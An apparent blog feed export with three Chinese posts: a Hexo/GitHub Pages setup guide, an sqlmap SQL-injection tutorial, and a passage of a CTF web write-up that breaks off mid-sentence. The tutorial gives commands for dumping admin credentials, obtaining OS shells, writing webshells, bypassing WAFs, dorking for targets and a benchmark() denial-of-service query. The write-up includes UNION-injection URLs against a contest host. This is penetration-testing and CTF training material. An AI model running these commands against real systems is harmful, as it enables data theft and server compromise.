        <content type="html"><![CDATA[<p>#hexo博客搭建</p><p>##安装git,nodejs,npm，并了解相关基础知识<br>下载nodejs和git(<a href="https://git-scm.com/)并安装" target="_blank" rel="external">https://git-scm.com/)并安装</a></p><p>确认安装成功</p><h2 id="建立github仓库"><a href="#建立github仓库" class="headerlink" title="建立github仓库"></a>建立github仓库</h2><p>新建一个名为你的用户名.github.io的仓库，比如说，如果你的github用户名是test，那么你就新建test.github.io的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <a href="http://test.github.io" target="_blank" rel="external">http://test.github.io</a> 了，是不是很方便？</p><p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。</p><p>几个注意的地方：</p><blockquote><p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br>创建成功后，默认会在你这个仓库里生成一些示例页面，以后你的网站所有代码都是放在这个仓库里啦。</p></blockquote><h2 id="本地安装Git"><a href="#本地安装Git" class="headerlink" title="本地安装Git"></a>本地安装Git</h2><p>进入 Git 官网，下载相应的 Git 版本，下载完成之后按照引导安装 Git 。安装完成之后在开始菜单中会有一个 Git Bash 。这是一个类似于Liunx的终端，在里面可以模拟Linux下的终端进行操作。</p><h2 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h2><p>打开 Git Bash ，执行下面的命令生成 SSH 访问私钥及公钥。</p><p>$ ssh-keygen -t rsa -C “email@email.com”<br>ssh | 300*0<br>输入命令回车之后会提示你输入一些东西，不用管。一直回车到底就好了。然后你的 ~/.ssh 文件下就会生成两个文件 id_rsa 和 id_rsa.pub 。</p><p>打开你的 Github -&gt; setting -&gt; SSH Keys 。然后点击 New SSH Key 创建一个新的SSH Key。Title 可以用你的计算机名，可以用以区分。将文件 id_rsa.pub 中的所以内容复制粘贴到 Key 下面。然后使用下面的命令测试是否可以连接上 Github 。</p><p>$ ssh -T git@github.com<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711210154_534.png" alt=""></p><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>Hexo的安装在其官方文档中有很详细的说明。下面将简单介绍Hexo的安装。</p><h4 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h4><p>安装 Node.js ，请进入Node.js 的官网下载安装。<br>安装 Git ，前面已经说明，不再赘述。</p><h4 id="安装Hexo-1"><a href="#安装Hexo-1" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>上面两个工具安装完整之后，打开 Git Bash ，只需要使用npm即可完成Hexo的安装。</p><p>$ npm install -g hexo-cli<br>安装Hexo完成之后，执行下面的命令，Hexo将会在你制定的文件夹中新建所需要的文件。</p><p>$ hexo init <folder><br>$ cd <folder><br>$ npm install<br>新建完成后，文件夹下的目录如下：</folder></folder></p><p>.<br>├── _config.yml<br>├── package.json<br>├── scaffolds<br>├── source<br>|   ├── _drafts<br>|   └── _posts<br>└── themes<br>_config.yml 文件是网站的配置文件，可以在其中配置网站的大部分参数。<br>package.json 文件是应用程序的信息。<br>source 是资源文件夹，是用来存放用户资源的地方。<br>themes 是主题文件夹，Hexo会根据主题来生成不同的静态页面。<br>scaffolds是模板件夹，当新建文章的时候，Hexo会根据模板来建立文件。</p><h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p><a href="https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：" target="_blank" rel="external">https://github.com/yelog/hexo-theme-3-hexo首先下载这个主题：</a></p><pre><code>$ cd /f/Workspaces/hexo/$ git clone https://github.com/yelog/hexo-theme-3-hexo themes/3-hexo</code></pre><p>修改_config.yml中的theme: landscape改为theme: 3-hexo，然后重新执行hexo g来重新生成。</p><p>如果出现一些莫名其妙的问题，可以先执行hexo clean来清理一下public的内容，然后再来重新生成和发布。</p><h2 id="上传之前"><a href="#上传之前" class="headerlink" title="上传之前"></a>上传之前</h2><p>在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉。</p><h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句hexo d就搞定，当然关键还是你要把所有东西配置好。</p><p>首先，ssh key肯定要配置好。</p><p>其次，配置_config.yml中有关deploy的部分：</p><p>正确写法：</p><p>deploy:<br>  type: git<br>  repository: git@github.com:liuxianan/liuxianan.github.io.git<br>  branch: master</p><p>错误写法：</p><p>deploy:<br>  type: github<br>  repository: <a href="https://github.com/liuxianan/liuxianan.github.io.git" target="_blank" rel="external">https://github.com/liuxianan/liuxianan.github.io.git</a><br>  branch: master</p><h2 id="总结：部署步骤"><a href="#总结：部署步骤" class="headerlink" title="总结：部署步骤"></a>总结：部署步骤</h2><p>每次部署的步骤，可按以下三步来进行。</p><p>hexo clean<br>hexo generate<br>hexo deploy</p><ol><li><p>总结：本地调试</p></li><li><p>在执行下面的命令后，</p></li></ol><p>$ hexo g #生成<br>$ hexo s #启动本地服务，进行文章预览调试<br>浏览器输入<a href="http://localhost:4000，查看搭建效果。此后的每次变更_config.yml" target="_blank" rel="external">http://localhost:4000，查看搭建效果。此后的每次变更_config.yml</a> 文件或者新建文件都可以先用此命令调试，尤其是当你想调试新添加的主题时。</p><ol><li>可以用简化的一条命令</li></ol><p>hexo s -g</p><h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><p>hexo clean 清除<br>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传<br>hexo server –debug  # 本地部署<br>hexo generate or hexo g  # 生成页面<br>hexo deployer or hexo d  # 部署到github<br>hexo new “title”  # 新建文章<br>hexo new page “about”  # 创建新页面</p><h2 id="3-Hexo主题的分类和标签设置："><a href="#3-Hexo主题的分类和标签设置：" class="headerlink" title="3-Hexo主题的分类和标签设置："></a>3-Hexo主题的分类和标签设置：</h2><p>这里遇到了坑<br>发了邮件问了这个主题的开发者<br>我以为是要用next主题形式创建hexo new page “ca”</p><pre><code>代码：tags: - 前端- hexocategories: - 前端在博客根目录输入hexo new page tags打开 tags/index.md ，并改成：title: 标签date: 日期type: &quot;tags&quot;comments: false分类同理hexo new page categories打开category/index.md，改为：title: 分类date: 日期type: &quot;categories&quot;comments: false</code></pre><p>实际上不需要 ，大概浪费了我两天时间的坑。<br>这个侧边栏分类无须单独配置，只要在文章中加入 categories</p><p>比如创建了一篇文章如下，加入 categories: 大前端， 这样就会在侧边栏自动出现 大前端 这个分类，且所有有 categories: 大前端 这个参数的文章都会归到这个分类下。<br>这个主题贼强 自动添加文集分类</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711221651_585.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711221651_329.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQLMAP注入教程-11种常见SQLMAP使用方法详解</title>
      <link href="/archis/18bbc00d/"/>
      <url>/archis/18bbc00d/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMAP注入教程-11种常见SQLMAP使用方法详解"><a href="#SQLMAP注入教程-11种常见SQLMAP使用方法详解" class="headerlink" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解"></a>SQLMAP注入教程-11种常见SQLMAP使用方法详解</h1><pre><code>sqlmap也是渗透中常用的一个注入工具，其实在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天把我一直以来整理的sqlmap笔记发布上来供大家参考。</code></pre><p>一共有11种常见SQLmap使用方法：</p><p>一、SQLMAP用于Access数据库注入</p><p>(1) 猜解是否能注入<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“<br>Linux : .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“</p><p>(2) 猜解表<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –tables</p><p>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –columns -T admin</p><p>(4) 根据字段猜解内容(假如通过3得到字段为username和password)<br>win: python sqlmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C “username,password”<br>Linux: .lmap.py -u “<a href="http://www.xxx.com/en/CompHonorBig.asp?id=7" target="_blank" rel="external">http://www.xxx.com/en/CompHonorBig.asp?id=7</a>“ –dump -T admin -C<br>“username,[url=]B[/url]password”</p><p>二、SQLMAP用于Cookie注入</p><p>(1) cookie注入，猜解表<br>win : python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –table –level 2</p><p>(2) 猜解字段，(通过1的表猜解字段，假如表为admin)<br>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –columns -T<br>admin –level 2</p><p>(3) 猜解内容<br>win :python sqlmap.py -u “<a href="http://www.xxx.org/jsj/shownews.asp" target="_blank" rel="external">http://www.xxx.org/jsj/shownews.asp</a>“ –cookie “id=31” –dump -T<br>admin -C “username,password” –level 2</p><p>三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</p><p>win:<br>python sqlmap.py -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell<br>Linux:<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –sql-shell</p><p>(2) 输入执行语句完成DDOS攻击<br>select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</p><h2 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h2><p>(1) 查找数据库<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ –dbs</p><p>(2) 通过第一步的数据库查找表(假如数据库名为dataname)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname –tables</p><p>(3) 通过2中的表得出列名(假如表为table_name)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name –columns</p><p>(4) 获取字段的值(假如扫描出id,user,password字段)<br>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321" target="_blank" rel="external">http://www.xxx.com/link.php?id=321</a>“ -D dataname -T table_name -C<br>“id,user,password” –dump</p><h3 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h3><p>(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件</p><pre><code>我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。</code></pre><ol><li>浏览器打开目标地址http:// www.xxx.com /Login.asp</li></ol><ol><li>配置burp代理(127.0.0.1:8080)以拦截请求</li></ol><ol><li>点击login表单的submit按钮</li></ol><ol><li>这时候Burp会拦截到了我们的登录POST请求</li></ol><ol><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li></ol><ol><li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass</li></ol><p>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。<br>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp</a></p><p>几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass</p><p>(2) 自动的搜索<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –forms</p><p>(3) 指定参数搜索<br>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url" target="_blank" rel="external">http://testasp.vulnweb.com/Login.asp[/url</a>] –data “tfUName=321&amp;tfUPass=321”</p><p>六、SQLMAP中Google搜索注入</p><p>inurl后面的语言是由自己定的</p><p>注入过程中如果选y是注入，如果不是选n</p><p>sqlmap -g inurl:php?id=</p><p>七、SQLMAP中的请求延迟</p><p>参数 –delay –safe-freq</p><p>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –safe-freq 3</p><p>参数</p><p>八、SQLMAP绕过WAF防火墙<br>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a><br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] -v 3 –dbs –batch –tamper “space2morehash.py”</p><p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p><p>都是编码方式</p><p>space2hash.py base64encode.py charencode.py</p><p>九、SQLMAP查看权限<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –privileges</p><p>十、SQLMAP伪静态注入<br>(1) 查找数据库<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ –dbs</p><p>(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname –tables</p><p>(3) 通过2中的数据表得到字段(假如得到的是tablename表)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename –columns</p><p>(4) 通过3得到字段值(假如从3中得到字段id，password)<br>python sqlmap.py -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html" target="_blank" rel="external">http://xxx.cn/index.php/Index/view/id/40.html</a>“ -D dataname -T<br>tablename -C “password” –dump</p><p>十一、SQLMAP注入点执行命令与交互写shell<br>(1) 注入点：<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="external">http://192.168.159.1/news.php?id=1</a></p><p>此处采用的是Linux系统<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-cmd=ipconfig</p><p>出现语言的选择根据实际的测试网站选择语言</p><p>指定目标站点D:/www/ </p><p>(2) 获取Shell<br>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url" target="_blank" rel="external">http://192.168.159.1/news.php?id=1[/url</a>] –os-shell</p><p>指定目标站点D:/www/</p><p>输入ipconfig/all</p><p>创建用户和删除用户</p><p>只要权限足够大，你可以输入使用任何命令。</p><p>其他命令参考下面：</p><p>从数据库中搜索字段</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</p><p>在dedecms数据库中搜索字段admin或者password。</p><p>读取与写入文件</p><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p><p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p><p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p><p>#示例：</p><p>1</p><p>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><p>使用shell命令：</p><p>1</p><p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell</p><p>接下来指定网站可写目录：</p><p>“E:\php\htdocs\dvwa”</p><p>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</p><p>sqlmap详细命令：</p><pre><code>-is-dba 当前用户权限（是否为root权限）-dbs 所有数据库-current-db 网站当前数据库-users 所有数据库用户-current-user 当前数据库用户-random-agent 构造随机user-agent-passwords 数据库密码-proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</code></pre><p>Options（选项）：</p><pre><code>-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）</code></pre><p>Target（目标）：</p><p>以下至少需要设置其中一个选项，设置目标URL。</p><pre><code>-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。</code></pre><p>Request（请求）：</p><p>这些选项可以用来指定如何连接到目标URL。</p><pre><code>-data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</code></pre><p>Enumeration（枚举）：</p><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p><pre><code>-b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shell</code></pre><p>Optimization（优化）：</p><p>这些选项可用于优化SqlMap的性能。</p><pre><code>-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</code></pre><p>Injection（注入）：</p><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p><pre><code>-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</code></pre><p>Detection（检测）：</p><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p><pre><code>–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页</code></pre><p>Techniques（技巧）：</p><p>这些选项可用于调整具体的SQL注入测试。</p><pre><code>–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符</code></pre><p>Fingerprint（指纹）：</p><pre><code>-f, –fingerprint 执行检查广泛的DBMS版本指纹</code></pre><p>Brute force（蛮力）：</p><p>这些选项可以被用来运行蛮力检查。</p><pre><code>–common-tables 检查存在共同表–common-columns 检查存在共同列</code></pre><p>User-defined function injection（用户自定义函数注入）：</p><p>这些选项可以用来创建用户自定义函数。</p><p>–udf-inject 注入用户自定义函数</p><p>–shared-lib=SHLIB 共享库的本地路径</p><p>File system access（访问文件系统）：</p><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p><pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</code></pre><p>Operating system access（操作系统访问）：</p><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p><pre><code>–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径</code></pre><p>Windows注册表访问：</p><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p><pre><code>–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。</code></pre><p>Miscellaneous（杂项）：</p><pre><code>–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第八届Geek部分web</title>
      <link href="/archis/83955867/"/>
      <url>/archis/83955867/</url>
      
        <content type="html"><![CDATA[<h1 id="第八届Geek部分web"><a href="#第八届Geek部分web" class="headerlink" title="第八届Geek部分web"></a>第八届Geek部分web</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="故道白云"><a href="#故道白云" class="headerlink" title="故道白云"></a>故道白云</h3><h4 id="方法一sqlmap："><a href="#方法一sqlmap：" class="headerlink" title="方法一sqlmap："></a>方法一sqlmap：</h4><p>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ –dbs<br>查找表<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag –tables<br>通过2中的表得出列名<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag –columns<br>获取字段的值<br>sqlmap -u “<a href="http://game.sycsec.com:2006/?id=1&amp;submit=submit" target="_blank" rel="external">http://game.sycsec.com:2006/?id=1&amp;submit=submit</a>“ -D f1ag -T flag -C “f4ag” –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711051714_889.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711052126_103.png" alt=""><br>SYC{HACKEr_By-cL0und}</p><h4 id="方法二手注："><a href="#方法二手注：" class="headerlink" title="方法二手注："></a>方法二手注：</h4><p>首先测试<br>这里写图片描述<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222316_785.png" alt=""><br>没有过滤#号，然后应该就知道干啥了</p><pre><code>http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select 1,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select SCHEMA_NAME,1 from information_schema.SCHEMATA limit 1,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select TABLE_NAME,1 from information_schema.TABLES where TABLE_SCHEMA=&#39;f1ag&#39; limit 0,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select COLUMN_NAME,1 from information_schema.COLUMNS where TABLE_NAME=&#39;flag&#39; limit 0,1%23http://game.sycsec.com:2006/?submit=submit&amp;id=0&#39;union select f4ag,1 from f1ag.flag%23</code></pre><p>SYC{HACKEr_By-cL0und}</p><h3 id="粗心的李超"><a href="#粗心的李超" class="headerlink" title="粗心的李超"></a>粗心的李超</h3><p>通过dirb扫描后台</p><p>备份文件泄露，index.php.bak</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222347_913.png" alt=""><br>flag:SYC{just_brute_is_ok!}</p><h3 id="Buy-me-a-Tesla"><a href="#Buy-me-a-Tesla" class="headerlink" title="Buy me a Tesla"></a>Buy me a Tesla</h3><p>一看sign参数就有猫腻<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222348_221.png" alt=""></p><p>发现就是url解密一下然后base64解密三次即可</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711222350_33.png" alt=""></p><p>反编码<br>带入sign</p><p>SYC{KeYiGeiWoMaiYiGeZhenDeTeslaMa?}</p><h3 id="PHP的悖论1"><a href="#PHP的悖论1" class="headerlink" title="PHP的悖论1"></a>PHP的悖论1</h3><p>题目：</p><p>链接：<a href="http://game.sycsec.com:2009/10111.php" target="_blank" rel="external">http://game.sycsec.com:2009/10111.php</a><br>解题思路：</p><p>1.题目的意思很明了，要post两个变量使得if语句成立拿flag。</p><p>了解了一下==，===，！=和！==的含义，这里po出来，也算是一种复习了。</p><p>Tips：a==b： 意思是a和b的值相等，但类型不需要相同。</p><p>a===b: 意思是a和b的值和类型都要相同。</p><p>!=和！===的区别和上述类似。</p><p>2.大致了解了基本含义之后剖析题目，这个if语句成立的条件是s1和s2的值和类型都不相同，并且其经过MD5加密之后的值和类型要完全相同。看起来有点绕，并且毫无思路。看了一个博客就get了，附上链接<a href="http://www.cnblogs.com/weidiao/p/6821812.html。" target="_blank" rel="external">http://www.cnblogs.com/weidiao/p/6821812.html。</a></p><p>3.可以知道，如果将s1和s2都变为数组，并且值不同，便可以满足if的条件，得到flag。<br>关键语句</p><pre><code>if 